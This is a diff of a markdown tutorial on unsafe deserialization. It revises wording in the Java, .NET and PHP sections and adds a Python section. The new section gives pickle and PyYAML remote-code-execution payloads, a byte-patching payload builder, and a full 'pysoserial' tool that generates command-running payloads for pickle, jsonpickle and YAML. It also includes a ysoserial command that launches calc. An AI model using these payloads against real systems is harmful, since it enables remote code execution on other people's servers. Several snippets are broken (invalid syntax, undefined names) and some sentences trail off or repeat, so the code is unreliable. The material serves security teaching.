@@ -1,10 +1,10 @@
 # The big problem of serialization
 
-One of the biggest security issues affecting OOP Languages during the last years was "Unsafe Deserialization". As a wide range of literature is already available for this issue, this post objective is not to introduce something new about it, but to provide a brief and precise explaination of the vulnerability, as well as common exploitation and detection methods applied on different programming languages. 
+One of the biggest security issues affecting OOP Languages during the last years was "Unsafe Deserialization". As a wide range of literature is already available for this issue, the main objective of this document is not to introduce something new about it, but to provide a brief and precise explaination of the vulnerability, as well as common exploitation and detection methods, which can be applied on different programming languages. 
 
 ## Serialization: What is it?
  
-Object serialization, also known as "marshalling", is just a process that converts an object-state, in the form of an arbitratily complicated data structure, in a way (commonly a serialized string) that can be easily sent in message, or stored in a database or a text file. The serialized object-state could then be reconstructed using the opposite process, called deserialization, or "unmarshalling", producing an object that is "semantically" identical to the original.
+Object serialization, also known as "marshalling", is just a process that converts an object-state, in the form of an arbitratily complicated data structure, in a way (commonly a serialized string) that can be easily sent in message, stored in a database, or saved in a text file. The serialized object-state could then be reconstructed using the opposite process, called deserialization, or "unmarshalling", producing an object that is "semantically" identical to the original.
 
 If we look at just the definition, it seems to be an easy process, but effectively it's not. Serialization is a low-level technique that violates encapsulation and breaks the opacity of an abstract data type. 
 
@@ -144,7 +144,7 @@ $ hexdump.exe -C de.ser
 The starting bytes, `ac ed 00 05` are a known signature for JAVA serialized objects. Prior to step further on, we should notice that the `Deserialize` function, calls one of the potentially exploitable function of JAVA, `readObject()`. This function, indeed, constitutes one of the POP gadget of JAVA. During the deserialization via `readObject()`, the serialized-object properties are accessed recursively, untill every properties have been read. This process occurs due to the nature of serialization (As an exact clone of the original object is the result of this process, each and every properties must be read and re-instantiated). 
 
 How can we exploit it? Basically, the trick is to pass an arbitrary nested object to the `readObject()` function, forcing the application to instantiate a chain of POP gadgets, leading to RCE. The POP gadgets that can be used may vary depending on the application `CLASSPATH` (as any gadget function must be on the classpath in order to be instantiated [Visibility Constraint]). 
-The ROP chain uses an opaque class order in order to chain subsequent classes using reflection, which allows dynamic class and method loading even without prior knowledge of these classes and methods. The main pattern used to create chains is to use the DynamicProxy pattern, which more details can be found [here](https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/proxy.html).
+The ROP chain uses an opaque class order in order to chain subsequent classes using reflection, which allows to dynamically load classes and methods even without prior knowledge of these classes and methods. The main pattern used to create chains is to use the DynamicProxy pattern, which more details can be found [here](https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/proxy.html).
 
 Following, a very basic example of DynamicProxy implementation:
 
@@ -224,11 +224,11 @@ For the Deserialization example provided above, let's suppose we wanted to craft
 $ ysoserial CommonsCollections7 "cmd /c calc.exe" > ./Serialize/de.ser
 ```
 
-If you try to open it uing the example JAVA file, of course it won't work, showing a `java.lang.ClassNotFoundException: org.apache.commons.collections.map.LazyMap` exception. The reason is always the "visibility constraint". As this payload uses `CommonsCollections:3.1`, which is not part of standard JAVA SDK, the POP gadgets to build the required chain cannot be found. In order to make it working, we should be sure to have this dependency in the application classpath. A working example, where the `org.apache.commons-collections:3.1` dependency has been added, can be found [here](./serialization/java/). 
+If you try to open it using the example JAVA file, of course it won't work, showing a `java.lang.ClassNotFoundException: org.apache.commons.collections.map.LazyMap` exception. The reason is always the "visibility constraint". As this payload uses `CommonsCollections:3.1`, which is not part of standard JAVA SDK, the POP gadgets to build the required chain cannot be found. In order to make it work, we should be sure to have this dependency on the application classpath. A working example, where the `org.apache.commons-collections:3.1` dependency has been added, can be found [here](./serialization/java/). 
 
-Now that we have a general understanding of the process, let's try to describe the full steps occuring during deserialisation in Java using CommonsCollections.
+Now that we have a general understanding of the process, let's try to describe the full steps occuring during deserialisation in Java using CommonsCollections7.
 
-Payloads generated with ysoserial share a common structure, which use a Payload Runner using maps to setup the conditions and a transformer to actually build and run the OS command. 
+Payloads generated with ysoserial share a common structure, which use a Payload Runner using maps to setup the conditions, and a transformer to actually build and run OS commands. 
 
 Let's take a deep look at CommonsCollections7:
 
@@ -290,13 +290,13 @@ Let's dissect the above code:
     + Class found ->  java.util.Hashmap.reconsitutionPut is called 
 3. We forced an hash collishion, so a comparison is issued using `equals`
 4. The decorator forwards the method to the AbstractMap -> lazyMap
-5. The lazyMap attempts to retrieve a value with key equal to the map
+5. The lazyMap attempts to retrieve a value with a key equal to the "map"
 6. Since that key does not exist, the lazyMap instance goes ahead and tries to create a new key
 7. Since  a  chainedTransformer  is  set  to  execute  during  the  key  creation process, the chained transformer with the malicious payload is invoked, leading to remote code execution.
 
 #### Java: Text-based Seriliazation Archive
 
-Of course, this is problem doesn't affect just the binary archive format, but can be extended to text-based serialization archives. As we said, the most common formats used are XML and JSON.
+Of course, this issue doesn't affect just the binary archive format, but can be extended to text-based serialization archives. As we said, the most common formats used are XML and JSON.
 
 **XML**
 
@@ -532,12 +532,9 @@ namespace BinarySerialization
                 BinarySerialization.deleteFile(filename);
                 BinarySerialization.desertSerial(filename);
             }
-
             Console.WriteLine();
             Console.WriteLine("Press Enter Key");
             Console.Read();
-
-
         }
 
         public static void deleteFile(string filname)
@@ -572,7 +569,6 @@ namespace BinarySerialization
             formatter.Serialize(stream, desert);
             stream.Close();
         }
-
     }
 
     [Serializable]
@@ -1135,7 +1131,7 @@ public static void xmlRCESerial(string filename)
 } 
 ```
 
-Hoever, we can possibly exploit this function by means of POP gadgets:
+However, we can possibly exploit this function by means of POP gadgets:
 
 
 
@@ -1145,9 +1141,6 @@ In their reasearch, [Firday the 13th, JSON Attacks](https://www.blackhat.com/doc
 
 The 
 
-To get a better look to the process, we'll explore a way to use the XAML formatter to achieve remote code execution during deserialization abusing the gadget `ObectDataProvider`.
-
-The follwing PoC uses the steps above to serialize data which results in an RCE:
 
 
 
@@ -1193,5 +1186,351 @@ A good example of serialized object in PHP is the session file, usually stored w
 
 #### PHP: How the exploitation works
 
-The exploitation in PHP is strictly dependent on the specific application implementation.
+The exploitation in PHP strictly depends on an application specific implementation.
+
+
+### Python
+
+Python as well offers built-in support for serialization/deserialization, with many library that can easily marshal an objects using different archive-formats, as binary, XML, JSON, YAML, and so on.
+Within the years, a few module were found to be affected by unsafe deserialization issues
+only two libraries were found to be affected by unsafe deserialization issues, though. Those were Pickle, handling binary serialization, and PyYAML, handling YAML deserialization.
+
+#### Python: Binary Archive Format
+
+In Python, the main library hanlding Binary serialization is Pickle (provided in different packages, as cPickle, pickle and _pickle). This library is know to be affected by an RCE upon deserilization.
+
+Let's consider the following piece of code:
+
+```python
+import os
+import _pickle
+
+class Desert(object):
+    def __init__(self, name, width, heigth):
+        self.name = name
+        self.width = width
+        self.height = height
+
+    def __reduce__(self):
+        return Desert("Gobi", 8, 10)
+
+# The application insecurely deserializes a file
+def desert_deserialize(filename):
+    with open(filename, "r") as desert_file:
+        _pickle.loads(desert_file)
+
+if __name__ == '__main__':
+    desert = desert_deserialize()
+
+```
+
+As you can see, the cPickle `load()` function is called without any prior check on the file content, allowing an attcker to pass an arbitrary binary payload to the application.
+
+How can we exploit it, then? In Python, we don't actually have any tool like ysoserial, and we don't have a clear definition of POP gadget as it was for the previous languages we encountered so far, but in this context, we actually don't need them at all.
+
+Indeed, for pickle, _pickle and cPickle, we can craft a payload using a simple piece of code, like the following:
+
+```python
+import _pickle
+
+class Payload(object):
+    def __reduce__(self):
+        return (os.system, ('whoami',))
+
+def serialize_exploit():
+    shellcode = _pickle.dumps(Exploit())
+    return shellcode
+
+```
+
+Changing the return function it would be possible to generate the payload needed to execute different commands.
+
+It is enough, however, it is more than possible to create something way more general than this, using various techniques, the first we'll see is known as dynamic class generation, code below:
+
+```python
+import os
+import _pickle
+import sys
+
+def Payload:
+    pass
+
+    def __reduce__(self):
+        pass
+
+def _patch(bytestream):
+    byte_array = bytearray(bytestream)
+    byte_array[-4] = int("52", 16)
+    return bytes(byte_array)
+
+def generate_class(name=None, methods=None):
+    if not name:
+        return None
+    elif not methods:
+        return None
+    else:
+        return type(name, (object,), methods)()
+
+def serialize_class(commands):
+    if not commands:
+        print(f"[-] No command provided")
+    else:
+        methods = {
+            "__reduce__": lambda self: (os.system, (commands,))
+        }
+        cls = generate_class("Payload", methods)
+        return cls.__reduce__()
+
+command = " ".join(sys.argv[1:])
+print(f"[+] Generating serialized object for:")
+print(f"    {command}")
+
+with open("payload", "wb") as payload:
+    payload.write(_patch(_pickle.dumps(serialize_class(command))))
+
+```
+
+As you may notice, a function called `_patch` is applied to the serialized object, applying a patch to the binary archive after serialization. This trick has been used because the lambda function, although being bound to the attribute `__reduce__` is not interpreted as the reduce method, but as a lambda function:
+
+* Static definition
+
+```
+>>> print(Payload.__getattribute__(Payload(), "__reduce__"))
+<bound method Payload.__reduce__ of <__main__.Payload object at 0x00000209218B9518>>
+```
+
+* Dynamic definition
+
+```
+>>> cls = generate_class("Payload", methods)
+>>> print(cls.__getattribute__("__reduce__"))
+<bound method serialize_class.<locals>.<lambda> of <__main__.Payload object at 0x00000209218B9080>>
+```
+
+Although that would not stop the serialization, it would cause the payload to not be executed upon deserialization. However, the `_patch` function successfully fix this issue at byte-code level, making the payload executable again.
+
+There is, however, a nicer way of achieving that, keeping the good part (setting arbitrary commands), and avoiding the bad one (dynamic class definition and patching), but we'll see it later, when we'll craft a simple payload generator for both binary and text-based formats.
+
+#### Python: Text-Based Archive Format
+
+As we now, several different libraries are offered by Python which support text-based serialization archives, such as json (or simplejson), or ETree (for XML). Even though most of these libraries are known to be secure, a few of them are susceptible to this kind of attack. In the following paragraphs, we'll briefly explain how the text-based serialization works, how to exploit it, and how to generate custom payloads.
+
+**YAML**
+
+The first of the library we're going to analyse is PyYAML; as its name suggests, it is a library to handle the YAML format. As previously stated, it was found to be vulnerable to deserialization issues.
+
+Before digging into how to exploit this kind of vulnerability, let's take a brief look at the serialization process. The following example shows a very simple object being serialized from the python console:
+
+```python
+>>> yaml.dump([{"a":"b"}])
+'- a: b\n'
+>>> yaml.dump([{"a":("b","c")}])
+'- a: !!python/tuple\n  - b\n  - c\n'
+```
+
+Analyse the serialized object is not difficult, dict and lists are handled nicely, while other object must be seriliazed with their class notation. The above object, for example, would be translated as:
+
+```python
+-                 ==== [ 
+a :!!python/tuple ==== {a : tuple(
+- b - c           ==== b, c
+                  ==== )}
+                  ==== ]
+```
+
+In order to serialize an arbitrary class, the `__reduce__` method must be implemented, in a similar way it was for pickle.
+
+How the exploitation works? Let's consider the following vulnerable code:
+
+```python
+import yaml
+
+# Try to create the desert object from YAML file
+with open('desert.yml') as desert_file:
+    if float(yaml.__version__) <= 5.1: 
+        desert = yaml.load(desert_file)
+    else:
+        desert = yaml.unsafe_load(desert_file)
+# Try printing the desert name
+print(desert['name'])
+```
+
+You may appreciate the version check before the actual call to `load`. This was done on purpose because from PyYAML >= 5.1, the `load` function was patched to avoid "function" deserialization (e.g. `os.system`, `subprocess.call`, `subprocess.check_output`). However, it may still be possible to exploit it using non function based vectors as `subprocess.Popen`, as nicely exposed [here]().
+The main concept is the always the same, trick the appliction into loading arbitrary classes/methods. In the case of PyYAML, the following payload can be used to spawn a calculator on the hosting server:
+
+```yaml
+!!python/object/apply:nt.system
+- cmd /c calc
+```
+
+Later we'll see how to create custom payloads dynamically.
+
+**JSON**
+
+The same vulnerability we've already seen in pickle can be applied to jsonpickle. As the name may suggest, the jsonpickle module is actually a json library built on top of pickle. The deserialization issue is located in the `decode()` function call, as it may be seen in the following vulnerable code snippet:
+
+```python
+import jsonpickle
+
+with open("payload.json", "r") as payload:
+    jsonpickle.decode(payload.read())
+```
+
+If we analyse the function call using a tracing function, we'll see that actually the sys module calls the vulnerable function `loads`. To confirm that, the following snippet may be used:
+
+```python
+import sys
+import jsonpickle
+import re
+
+
+def trace(frame, event, arg):
+    if event != 'call':
+        return
+    c_object = frame.f_code
+    func_name = c_object.co_name
+    if not re.search(r"load", func_name):
+        return
+    func_name_line_no = frame.f_lineno
+    func_filename = c_object.co_filename
+    caller = frame.f_back
+    caller_line_no = caller.f_lineno
+    caller_filename = caller.f_code.co_filename
+    print('Call to {0} on line {1} of {2} from line {3} of {4}'.format(func_name, func_name_line_no, func_filename,caller_line_no, caller_filename))
+
+
+with open("payload.json", "r") as payload:
+    sys.settrace(trace)
+    jsonpickle.decode(payload.read())
+
+```
+
+Which would produce the following results:
+
+```
+$ python tracer.py
+
+Call to loads on line 299 of C:\Users\amagnosi\AppData\Local\Programs\Python\Python37\lib\json\__init__.py from line 207 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-packages\jsonpickle\back
+end.py
+Call to loadclass on line 600 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-packages\jsonpickle\unpickler.py from line 326 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-
+packages\jsonpickle\unpickler.py
+```
+
+Ok, that's sounds interesting, but how can we exploit all these cases? Moreover, is that possible to craft a more general way to effectively serialize this kind of payloads? The answer is, as you may imagine, that is definitely possible to do that.
+
+Taking as a general example the following vulnerable code:
+
+```python
+import _pickle
+import sys
+import yaml
+import jsonpickle
+
+if sys.argv[1] == "b":
+    with open("payload.bin", "rb") as payload:
+        _pickle.loads(payload.read())
+elif sys.argv[1] == "y":
+    with open("payload.yml", "r") as payload:
+        if float(yaml.__version__) <= 5.1: 
+            yaml.load(payload)
+        else:
+            yaml.unsafe_load(payload)
+elif sys.argv[1] == "j":
+    with open("payload.json", "r") as payload:
+        jsonpickle.decode(payload.read())
+```
+
+For the sake of giving a working example, I created the following code, which can be used to generate different payloads for pickle, yaml and jsonpickle:
+
+```python
+import os
+import _pickle
+import subprocess
+import jsonpickle
+import sys
+import yaml
+import argparse
+
+
+class Payload:
+    def __init__(self, commands, vector=None):
+        self.vector = vector
+        self.commands = commands
+
+    def __reduce__(self):
+        if self.vector == "os":
+            return os.system, (self.commands,)
+        elif self.vector == "subprocess":
+            return subprocess.Popen, (self.commands,)
+
+
+def print_available_formats():
+    available_formats = {
+        "pickle": "Format for cPickle and _pickle modules",
+        "json": "Format for jsonpickle module",
+        "yaml": "Format for PyYAML module"
+        }
+    for k, v in available_formats.items():
+        print(f"    {k}: {v}")
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(
+        description='pysoserial - A simple serialization payload generator', add_help=True)
+
+    parser.add_argument(
+        '-d', '--debug', required=False, action='store_true', default=False,
+        help='Enable debug messages')
+    parser.add_argument(
+        '-s', '--save', required=False, action='store_true', default=False,
+        help='Save payload to file')
+    parser.add_argument(
+        '-v', '--vector', required=False, choices=["os", "subprocess"], default="os",
+        help='Save payload to file')
+    parser.add_argument(
+        '-f', '--format', required=True, choices=["pickle", "json", "yaml", "#"], default="#",
+        help='Serialization archive format')
+    parser.add_argument(
+        '-c', '--command', type=str, required=False, default=None, help='Command for the payload')
+
+    args = parser.parse_args()
+
+    if args.format == "#":
+        print(f"[*] The following format are accepted:")
+        print_available_formats()
+        sys.exit()
+    if not args.command:
+        print(f"[-] A command (-c) is required to generate the payload")
+    command = args.command
+
+    print(f"[+] Generating serialized object for:")
+    print(f"    {command}")
+    cls = Payload(command, args.vector)
+
+    if args.format == "pickle":
+
+        with open("payload.bin", "wb") as payload:
+            payload.write(_pickle.dumps(cls))
+    elif args.format == "json":
+        with open("payload.json", "w") as payload:
+            payload.write(jsonpickle.encode(cls))
+    elif args.format == "yaml":
+        with open("payload.yml", "w") as payload:
+            yaml.dump(cls, payload)
+    else:
+        sys.exit()
+```
+
+Now that we explained the main ways to explained the main ways to exploit python 
+
+#### References
+
+* [PyYAML - Exploit-DB](https://www.exploit-db.com/docs/47655)
+* [Exploiting jsonpickle](https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/)
+
+### Ruby
+
+### NodeJS
+
+
 
